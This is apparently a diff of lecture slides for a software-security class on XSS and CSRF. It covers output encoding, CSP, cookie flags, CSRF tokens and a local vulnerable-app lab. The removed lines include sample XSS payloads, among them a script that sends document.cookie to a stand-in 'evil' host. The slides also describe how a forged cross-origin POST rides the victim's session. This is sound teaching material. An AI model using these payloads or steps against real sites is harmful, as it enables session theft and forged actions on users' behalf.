@@ -6,234 +6,115 @@ header: "Software Security · Week 5"
 ---
 
 # Week 5
-## XSS & Client-Side Risks
-Software Security · Nutthakorn Chalaemwongwan
+## XSS and browser request controls
+Software Security 2 · KOSEN69
 
-<!-- Hook: pop an alert(1) on a real site clone, then show the same payload exfiltrating a cookie. "XSS is injection that runs in YOUR browser, as the site you trust." ~2 min. -->
+<!-- 150 min: quiz/review 10; mechanism demo 15; practical 100; debrief 20; evidence exit 5. The 100-minute budget has not had a representative student pilot. -->
 
 ---
 
 ## Today
 
-- The browser security model
-- XSS: reflected / stored / DOM
-- CSRF + SameSite cookies
-- Content Security Policy (CSP)
-- 🎮 Game: **XSS Golf**
-
-<!-- Roadmap, 1 min. Frame: last week injection hit the server (SQL); this week it hits the client (the DOM). Same root cause, different interpreter (the browser). -->
+- Reflected and stored XSS: untrusted data becomes browser code
+- HTML output encoding; CSP as a second layer
+- Origin versus site; authenticated CSRF
+- Student patch: safe rendering **and** token validation
 
 ---
 
-## Recap — Week 4
+## Browser boundary
 
-- Injection = data interpreted as code
-- Parameterized queries fix SQLi
-- Same idea returns today — in the browser
+- **Origin** = scheme + host + port. `localhost:8080` and `localhost:8081` are different origins.
+- **Site** excludes port. Those two pages are the same site.
+- Same-origin policy limits what an attacker page can **read**. An HTML form can still **submit** to another origin.
+- Cookies are scoped by host/path and policy, **not by port**. SameSite controls cross-site attachment; it is not an origin check.
 
-<!-- 1-min bridge. The interpreter today is the browser's HTML/JS parser. Ask: "what was the one fix for SQLi?" then say: the XSS analogue is context-aware output encoding. -->
-
----
-
-## Browser security model
-
-- **Same-Origin Policy (SOP):** scripts only read data from same origin
-- Origin = scheme + host + port
-- Cookies, DOM, storage scoped per origin
-
-<!-- Foundational — XSS is dangerous precisely because injected script runs INSIDE the origin, so SOP protects the attacker's code, not you. Give an origin example: https://a.com:443 vs http://a.com differ. ~5 min. -->
+<!-- Demo with DevTools: the port-8081 request targets port 8080 and carries the localhost session cookie. -->
 
 ---
 
-## XSS = injection into the page
+## XSS: output turns data into code
 
-> Attacker JavaScript runs in the victim's browser, in the site's origin.
-
-- Steal cookies/sessions, keylog, rewrite the page, pivot
-- Maps to **OWASP A05:2025 Injection** (output side)
-
-<!-- Drive home: because the script runs as the site, it can do anything the user can. List concrete harms. "Output side" = the bug is in how we render data, not how we store it. ~4 min. -->
-
----
-
-## Three flavors of XSS
-
-| Type | Where the payload lives |
-|---|---|
-| **Reflected** | in the request, echoed back |
-| **Stored** | saved server-side, served to others |
-| **DOM** | client-side JS writes untrusted data to the DOM |
-
-- Today's graded app (`vulnerable_app.py`) implements **reflected + stored only**; DOM XSS is optional, via the ungraded Juice Shop target
-
-<!-- Go row by row with an example each: reflected = malicious link; stored = a comment that attacks every viewer (worst); DOM = `location.hash` written to innerHTML. Ask which is most dangerous and why (stored — hits everyone). Be clear DOM isn't part of today's graded tasks. ~6 min. -->
-
----
-
-## Example payloads
-
-```html
-<script>fetch('//evil/'+document.cookie)</script>
-<img src=x onerror=alert(1)>
-"><svg onload=alert(1)>
-```
-
-- Context matters: HTML body vs attribute vs JS vs URL
-- `vulnerable_app.py` filters **nothing** — every payload here fires as-is; the `<img onerror>` form isn't "the one that sneaks past a filter," it's just **3 characters longer** than `<script>alert(1)</script>` (28 vs. 25) — a real golf trade-off, not a bypass technique
-
-<!-- These are the XSS Golf payloads. There's no filter in this app to explain a bypass for — correct that instinct if it comes up. The context point (HTML body vs attribute vs JS vs URL) is still the real learning; `">` breaks out of an attribute first. ~6 min. -->
-
----
-
-## Try it — one value, four sinks
-
-The same input, landing in an HTML text node, an unquoted attribute, an
-`href="…"`, and a `<script>` string — at once. Pick an escaper, see which sinks it actually protects.
-
-```sim
-xss-context
-```
-
-<!-- Live payoff for "context matters" — one escaper is right for some of the 4 sinks and wrong for others, computed live rather than asserted (3 verdicts: EXECUTES / BROKEN / SAFE — a wrecked script tag is not "safe" either). Ties straight into the Defenses slide's "encode per context." ~4 min. -->
-
----
-
-## The fix: encode on output — data renders as text
+| Type | Payload source | This lab |
+|---|---|---|
+| Reflected | URL `name` echoed into `/hello` | Yes |
+| Stored | Saved comment rendered on `/comments` | Yes |
+| DOM | Client JS writes untrusted input into DOM | Optional separate target |
 
 ```python
-# vulnerable: raw value concatenated into HTML -> <script> is parsed as a tag
-html = "<h1>Hello, " + name + "!</h1>"
-
-# fixed: escape() for the HTML context -> < becomes &lt;, shown as text
-html = "<h1>Hello, " + str(escape(name)) + "!</h1>"
-# stored comments: Jinja autoescaping renders {{ c }} as text, not markup
+html = "<h1>Hello, " + name + "!</h1>"  # vulnerable HTML text sink
+html = "<h1>Hello, " + str(escape(name)) + "!</h1>"  # fixed
 ```
 
-- The bug is on **output** — storing `<script>` is fine; rendering it unescaped is not
-- `escape()` turns `<` into `&lt;` — the parser reads an **entity (text)**, never a tag-start
-- Encode for the **context** (HTML / attribute / JS / URL); CSP + HttpOnly are extra layers
-
-<!-- Parallel to Wk4's parameterize slide and Wk6's verify-signature slide. Same shape as SQLi but on the way OUT: the < is the pivot (like ' in SQL), and escaping makes it an entity the HTML parser treats as text, so the script is shown, not run. Stress: this is an OUTPUT bug — the same stored comment is safe once rendered with autoescaping. And escaping is context-dependent (the sim's point): escape for HTML body != attribute != JS != URL. CSP and HttpOnly reduce blast radius but are not the fix — in this lab escaping kills the payload before CSP would ever fire. ~6 min. -->
+HTML text encoding makes `<script>` visible text. JavaScript strings, URLs and attributes need their **own context-specific controls**.
 
 ---
 
-## XSS in one picture
+## XSS defense layers
 
-![Three versions of the /hello page: normal input you renders as text; injected <script>alert(1)</script> makes the browser parse a real script tag and run it in the site's origin; and the escaped version &lt;script&gt;... is read as an HTML entity so the browser shows the characters and runs nothing. XSS is an output bug — encode for the context so < can never start a tag.](img/xss-escape-breakout.svg)
+1. Encode at the output sink; use framework autoescaping.
+2. Set CSP to limit script execution if something still lands.
+3. Set `HttpOnly` so injected JavaScript cannot read a session cookie.
 
-<!-- Consolidation slide — leave it up during XSS Golf. All three states at once: blue = text/data, orange = the < that became a live tag. Point at the orange <script> in row 2 ('one character, and it runs'), then the blue &lt; in row 3 ('an entity — the parser shows it, never runs it'). Same story the xss-context sim animates live across the four sinks. ~3 min. -->
+`HttpOnly` does **not** stop page defacement. CSP does **not** replace encoding. In the fixed lab, encoding removes the payload before a CSP violation would fire.
 
----
-
-## CSRF — riding the user's session
-
-- Browser auto-sends cookies → attacker forges a state-changing request
-- Real defenses: **anti-CSRF tokens**, checking Origin/Referer, **and the endpoint actually checking who's asking**
-- `SameSite=Strict` alone stops the cookie from *attaching* cross-site — it does **not** stop a request from being *accepted* if the endpoint never checks authorization in the first place (today's lab proves this)
-
-<!-- Contrast with XSS: CSRF needs no script on the page — it abuses the browser auto-attaching cookies. Example: a hidden form that POSTs a comment. Don't let "SameSite fixes CSRF" stand unqualified — this week's own fixed_app.py sets SameSite=Strict+HttpOnly+Secure and the CSRF PoC still works, because /comments never checks a session or token at all. ~5 min. -->
+**OWASP 2025 A05 Injection · CWE-79 XSS**
 
 ---
 
-## Same cookie, opposite directions
+## CSRF: a valid cookie, forged intent
 
-![Two stacked panels comparing stored XSS with CSRF, using the same attacker/server/victim actors. Stored XSS: attacker posts a script, the victim loads it, it runs in the victim's origin and steals the cookie (no HttpOnly) — fixed by output encoding, not SameSite, since the payload is already same-origin. CSRF: the victim visits the attacker's page, which auto-submits a form; the browser attaches the cookie itself and the server can't tell the victim never meant to send it — fixed by SameSite plus a CSRF token the server actually checks, not HttpOnly, since no script ever reads the cookie.](img/xss-and-csrf.svg)
+1. The victim visits `localhost:8080/` and receives `session=abc123`.
+2. The victim opens the attacker page at `localhost:8081/csrf.html`.
+3. Its form POSTs to `localhost:8080/comments`; the browser attaches the same-site session cookie.
+4. The vulnerable handler checks the cookie but no token, so it accepts the forged comment.
 
-<!-- The step-by-step version of the bullets just covered — walk both panels left to right once. Land on the footnote: fixed_app.py kills the XSS but the CSRF still works, because encoding an output and checking a token are two unrelated fixes. ~4 min. -->
-
----
-
-## Which flag stops which attack? — drive it
-
-Flip HttpOnly, SameSite, and the token. The hardened server kills the XSS — but the CSRF still posts, until you add the token.
-
-```sim
-cookie-defense
-```
-
-<!-- The interactive matrix for the diagram above. Runs both of this week's real handlers: vulnerable_app.py (raw render, cookie with no flags) and fixed_app.py (escape + HttpOnly+SameSite=Strict+Secure), where /comments in BOTH checks no token. Three beats students have to see for themselves: (1) HttpOnly and output-encoding are SEPARATE layers — turn HttpOnly on but leave output raw and the script still runs (defacement), so encoding was the missing control, not HttpOnly; (2) run the full fixed_app.py preset and the XSS dies but the forged comment STILL posts — this is exactly Task 4 ("why SameSite=Strict blocks it") vs Task 5 ("the PoC still gets through — explain why"): SameSite stops the cookie from being ATTACHED, not the POST from being accepted; (3) only adding a server-side CSRF token (the real fix) returns 403. Drive presets in order: vulnerable → HttpOnly-only → fixed_app.py → add-a-token. ~4 min. -->
+In a fresh profile with no session, the same POST returns **401**. This control proves that the attack depends on the victim's session.
 
 ---
 
-## Real-world: British Airways (2018)
+## SameSite is not the whole CSRF defense
 
-- Attackers injected malicious JS (Magecart) into BA's site/app
-- Script **skimmed credit-card details** as users typed
-- ~380k payment records skimmed; ICO proposed a £183M fine, **finalized at £20M** (2020, ~89% reduction)
+- Ports 8080 and 8081 are different **origins** but the same **site**; even `SameSite=Strict` can accompany this request.
+- The reference handler requires a server-generated CSRF token tied to the sandbox session.
+- A normal form includes the token; the attacker's page cannot read it across origins.
+- Missing or wrong token returns **403**. An `Origin` check can add another layer.
 
-> Client-side injection = real money + real fines.
+**OWASP 2025 A01 Broken Access Control · CWE-352 CSRF**
 
-<!-- Make it real. Magecart = the keylogging harm from 2 slides ago, at scale, on a Fortune-500 checkout. Note it often enters via a compromised third-party script — which motivates CSP next. ~3 min. -->
-
----
-
-## CWE mapping
-
-- **CWE-79** — Cross-site scripting
-- **CWE-352** — CSRF
-- **CWE-1004** — cookie set without `HttpOnly` (this week's cookie-theft task)
-
-<!-- Quick reference for the worksheet — these three are what's graded this week. Clickjacking (CWE-1021) isn't part of this lab; don't cite it here. ~1 min. -->
+<!-- A file:// attacker page is cross-site and modern default-Lax behavior may block its cookie. Use the supplied port-8081 page for the graded demonstration. -->
 
 ---
 
-## Defenses
+## 100-minute practical
 
-- **Output encoding** per context (HTML/attr/JS/URL)
-- Framework auto-escaping (don't bypass with `innerHTML`/`dangerouslySetInnerHTML`)
-- **Content Security Policy** — a defense-in-depth *header*, set alongside escaping — it doesn't replace it
-- `HttpOnly` + `SameSite` cookies; anti-CSRF tokens **and an endpoint that actually checks who's asking**
+| Time | Task |
+|---:|---|
+| 5 min | Baseline: normal page, cookie, comment |
+| 15 min | Reflected XSS and HTML sink |
+| 15 min | Stored XSS and sandbox cookie |
+| 20 min | Same-site, cross-origin forged POST + no-session control |
+| 45 min | Student patch, controls, browser proof |
 
-<!-- The payoff. #1: encode for the OUTPUT CONTEXT (the bug is on output). Modern frameworks auto-escape — the danger is when devs opt out (innerHTML). Be accurate about CSP here: this lab's escaping already neutralizes every payload before CSP would ever matter, so students will NOT see a CSP violation fire in the console today — it's set as a header, its blocking behavior is asserted, not demonstrated, in this sandbox. ~6 min. -->
-
----
-
-## ⛳ Game — XSS Golf
-
-Craft the **shortest** payload that pops `alert(1)` / steals a cookie against `vulnerable_app.py`.
-
-- Solo scoring by character count (no filter to beat — it's a golf exercise, not a bypass race)
-- **Defend:** run `fixed_app.py` — same payloads, now escaped — then prove CSRF *still* works against it and explain why
-
-<!-- Explain before lab: this app is local, not Juice Shop; solo, not a bonus-round competition. The real graded turn is running fixed_app.py and showing escaping stops the golf payloads while CSRF still gets through — that contrast is the point. ~3 min. -->
+Prepare the Docker image **before class**. `docker compose up --no-build --pull never` needs no runtime package download.
 
 ---
 
-## Lab steps
+## Student patch: prove normal and attack controls
 
-> 📋 **Worksheet 5** — `labs/week05-xss-client-side/worksheet.md` (Part 3) · **kickoff:** `docker compose up` → http://localhost:8080
+Edit `student_patch.py`:
 
-1. Find reflected + stored XSS in `vulnerable_app.py` (DOM XSS via Juice Shop is optional/ungraded)
-2. Demonstrate cookie theft via the stored payload
-3. Run `fixed_app.py` — confirm output encoding + CSP now block your XSS payloads
-4. Demonstrate CSRF **still succeeds** against `fixed_app.py` — explain why SameSite didn't stop it
+- `render_name` and `render_comment`: encode for an HTML text node.
+- `allow_post`: require the sandbox session and a nonempty matching CSRF token.
 
-<!-- Logistics. Step 4 is the one people get backwards: the defended app still falls to CSRF, on purpose — the lesson is that SameSite protects cookie *attachment*, not request *authorization*. Steps 3-4 (defend) are graded. The weekly quiz no longer asks for their scoring payload/sink/flag (dropped — quiz runs before the lab) — that's required in the worksheet instead. -->
+Run `student_checks.py` and `student_app.py`. Verify: normal comment **works**; XSS is text; forged POST is **403**; missing session is **401**. Read `fixed_app.py` only after your own patch.
 
 ---
 
-## Deliverable
+## Assessment and exit
 
-- Each XSS type with payload + context
-- Escaping + CSP that blocks them (show before/after)
-- Short note: why CSRF still succeeds against `fixed_app.py` despite `SameSite=Strict`
-- **+ Audit the AI / EiPE / Prompt Problem** (see worksheet)
+- **Common practical 60:** XSS observations 20, CSRF with controls 15, student patch 25.
+- **Assigned 40:** Conventional questions **or** AIR-Sec Audit the AI 20 + EiPE 10 + Prompt 10.
+- Save code, browser evidence, request headers and your own explanation. Check the live assignment for the deadline.
 
-<!-- Before/after + the reasoning note — the CSRF note is graded on getting the SameSite-doesn't-equal-authorization distinction right, not on claiming the defense worked. Remind the AI-resilient tasks count. -->
-
----
-
-## Key takeaways
-
-- XSS is injection on the output side — encode for the context
-- CSP is defense-in-depth, not a substitute for encoding
-- **SameSite cookies stop the cookie attaching cross-site — they don't stop a request being accepted if the endpoint never checks authorization**
-
-<!-- Recap. Cold-call: "where is the XSS bug — input or output?" (output rendering). Second cold-call: "if SameSite=Strict is set, why did CSRF still work today?" (the endpoint never checked who was asking). ~2 min. -->
-
----
-
-# Questions?
-Next week: Authentication, sessions & access control
-
-<!-- Cliffhanger: "Next week — change one number in a URL and read someone else's data; forge a token and become admin." Remind Juice Shop ready. -->
+**Sources:** [OWASP XSS prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html); [OWASP CSRF prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html); [OWASP Top 10:2025](https://top10.owasp.org/2025/).
